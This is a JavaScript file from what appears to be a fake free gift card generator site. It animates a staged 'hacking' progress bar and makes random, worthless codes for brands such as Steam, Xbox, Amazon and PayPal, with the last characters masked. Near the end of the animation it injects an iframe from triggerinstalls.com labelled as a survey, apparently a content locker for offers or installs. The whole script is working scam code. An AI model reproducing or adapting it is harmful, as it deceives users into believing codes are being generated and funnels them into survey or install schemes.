//= require jquery
//= require jquery_ujs
//= require turbolinks
//= require velocity.min
//= require velocity.ui.min
//= require_tree .

$(document).on("turbolinks:load", function(){
  $(".read-more-link").click(function(event) {
    if($("#hidden_text").hasClass("hidden")) {
      $("#hidden_text").removeClass("hidden");
      $("#hidden_text").addClass("show");
      $(this).attr("style", "height: 0px; opacity: 0; margin-top: -7vw;");
    }
  });

  setInterval(function() {
    var swaped = reversequeueu($(".start-gift-card"));

    l = $(".start-gift-card").length;
    $.each($(".start-gift-card"), function(index, val) {
      $(this).removeClass(function (index, className) {
        return (className.match (/(^|\s)(pos-)\S+/g) || []).join(' ');
      });
      $(this).addClass("pos-" + swaped[index])
    });
  }, 1000);

  $(".gift-card-home").each(function() {
    $(this).click(function(event) {
      var hidden_child = $(this).children(".hidden");
      if($(this).hasClass("show")){
        $(this).removeClass("show");
        $(hidden_child).velocity("transition.slideUpOut", 200)
          .velocity({ opacity: 0 }, 300);
      } else {
        $(this).addClass("show");
        $(hidden_child).attr("style", "height: auto").velocity("transition.slideDownIn", 750);
      }
    });
  })

  $("#menu-trigger").click(function(event) {
    if($(this).hasClass("close")) {
      $("#menu").removeClass("menu");
      $("#wrapper").removeClass("menu");
      $(this).removeClass("close");
    } else {
      $("#menu").addClass("menu");
      $("#wrapper").addClass("menu");
      $(this).addClass("close");
    }
  });

  $("#chooser div.choose-gift-card").each(function(){
    $(this).click(function(event) {
      $("#gbmouse").addClass("show");
      $("#gboverlay").attr("style", "display: block;");
      $("#generatorbox").addClass("big");
      $("#generatorbox").attr("style", "top: 50%; left: 50%; opacity: 1; transform: scaleX(1) scaleY(1);");
      var width = $("#statusbar").width(), steps = 3;

      $("#sbcomplete")
      .velocity({
          width: width,
          tween: 100
      }, {
          delay: 500,
          duration: 6000,
          progress: function(elements, complete, remaining, start, tweenValue) {
            switch(Math.round(tweenValue)) {
              case 0:
                showStatusText(1, 0);
                break;
              case 5:
                showStatusText(1, 1);
                break;
              case 10:
                showStatusText(1, 2);
                break;
              case 15:
                showStatusText(1, 3);
                break;
              case 20:
                showStatusText(1, 4);
                break;
              case 25:
                showStatusText(1, 5);
                break;
              case 30:
                showStatusText(1, 6);
                break;
              case 35:
                showStatusText(1, 7);
                break;
              case 40:
                showStatusText(1, 8);
                break;
              case 43:
                $("#sbcirca2").addClass("active");
                $("#genlogo").addClass("hide");
                $("#genreturn").addClass("active");
                showStatusText(2, 0);
                break;
              case 95:
                $("#widgetholder").addClass("show");
                $("#iSurvey").contents().children().attr("style", "overflow-y: visible;")
                $("#widgetholder").html('<iframe src="http://triggerinstalls.com/a1432" id="iSurvey"></iframe>');
                break;
              case 100:
                $("#sbcirca3").addClass("active");
                showStatusText(3, 0);
                $("#sbcomplete").attr("style", "width: 100% !important");
                break;
            }
            var counter  = Math.round(tweenValue, -1);
            while(counter > 50) {
              var card = $("#start").attr("class");
              $("#genreturn").html(returnCode(card, remaining));
              break;
            }
          }
      });
    })
  });
});

function returnCode(card, remaining) {
  var last_4 = remaining == 0 ? "XXXX" : makeCode(4);
  var last_5 = remaining == 0 ? "XXXXX" : makeCode(5);
  var last_6 = remaining == 0 ? "XXXXX" : makeCode(6);
  var paypal_last = remaining == 0 ? "**" : makeCode(2);
  switch(card){
    case "google":
      return '<span>'+makeCode(5)+'</span>-<span>'+makeCode(6)+'</span>-<span>'+makeCode(5)+'</span>-<span class="final active">'+last_6+'</span>';
      break;
    case "xbox":
      return '<span>'+makeCode(5)+'</span>-<span>'+makeCode(5)+'</span>-<span>'+makeCode(5)+'</span>-<span>'+makeCode(5)+'</span>-<span class="final active">'+ last_5 +'</span>';
      break;
    case "steam":
      return '<span>'+makeCode(5)+'</span>-<span>'+makeCode(5)+'</span>-<span class="final active">'+ last_5 +'</span>';
      break;
    case "playstation":
      return '<span>'+makeCode(4)+'</span>-<span>'+makeCode(4)+'</span>-<span class="final active">'+ last_4 +'</span>';
      break;
    case "spotify":
      return '<span>'+makeCode(5)+'</span>-<span>'+makeCode(5)+'</span>-<span>'+makeCode(5)+'</span>-<span class="final active">'+ last_5 +'</span>';
      break;
    case "itunes":
      return '<span>'+makeCode(4)+'</span>-<span>'+makeCode(4)+'</span>-<span>'+makeCode(4)+'</span>-<span class="final active">'+ last_4 +'</span>';
      break;
    case "paypal":
      return '<span>'+makeCode(9)+'</span>-<span class="final active">'+ paypal_last +'</span>';
      break;
    case "amazon":
      return '<span>'+makeCode(4)+'</span>-<span>'+makeCode(4)+'</span>-<span>'+makeCode(4)+'</span>-<span class="final active">'+ last_4 +'</span>';
      break;
  }
}

function makeCode(digit)
{
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  for( var i = 0; i < digit; i++ )
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  return text;
}

function showStatusText(level, index) {
  var text = $("#hacklines .level" + level)[index].textContent
  $("#statustext").text(text);
}

function myswap(input) {
  var array = [];
  for (var i = 0; i < input.length; i++) {
    array.push(input[i]);
  }
  var j = array.shift();
  array.push(j);
  return array;
}

function reversequeueu(input) {
  var array = [];

  $.each(input, function(index, val) {
    pos_class = this.className.match (/(pos-)\S+/g)[0];
    num = pos_class.substr(pos_class.indexOf("-")+1, pos_class.length)
    array.push(num);
  });

  var l = array.length;
  var temp = array[l-1]
  array = array.slice(0, l-1);
  array.splice(0, 0, temp);
  return array;
}

